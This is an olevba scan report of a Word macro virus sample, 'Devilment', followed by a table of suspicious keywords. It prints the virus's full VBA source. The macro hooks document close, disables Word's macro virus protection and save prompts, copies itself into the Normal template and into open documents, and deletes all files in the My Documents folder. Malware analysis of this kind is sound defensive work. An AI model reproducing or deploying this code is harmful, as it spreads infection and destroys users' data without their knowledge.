olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Devilment
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Devilment - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Devilment.bas 
in file: Virus.MSWord.Devilment - OLE stream: 'Macros/VBA/Devilment'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub FileClose()
Attribute FileClose.VB_Description = "Closes all of the windows of the active document"
Attribute FileClose.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.FileClose"
'Devilment
'An experiment in Macro programming ;)
'Ha Ha Ha
 On Error Resume Next
  Application.Options.VirusProtection = False
  Application.Options.SaveNormalPrompt = False
  Application.Options.ConfirmConversions = False
  Dim x As Integer
  Dim found As Boolean
  found = False
  x = 1
  For x = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents.Item(x).CodeModule.Lines(2, 1) = "'Devilment" Then found = False
  Next x
  If Not found Then
    Application.OrganizerCopy ActiveDocument.FullName, NormalTemplate.FullName, "devilment", wdOrganizerObjectProjectItems
  End If
  If NormalTemplate.Saved = False Then NormalTemplate.Save
  
  found = False
  x = 1
  For x = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents.Item(x).CodeModule.Lines(2, 1) = "'Devilment" Then found = False
  Next x
  If Not found Then
    NormalTemplate.VBProject.VBComponents("devilment").Export ("c:\devilment.tmp")
    ActiveDocument.VBProject.VBComponents.Import ("c:\devilment.tmp")
    ActiveDocument.SaveAs ActiveDocument.FullName
    Kill ("c:\devilment.tmp")
    Kill ("c:\mydocu~1\*.*")
  End If '
    WordBasic.FileClose

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Kill                |May delete a file                            |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

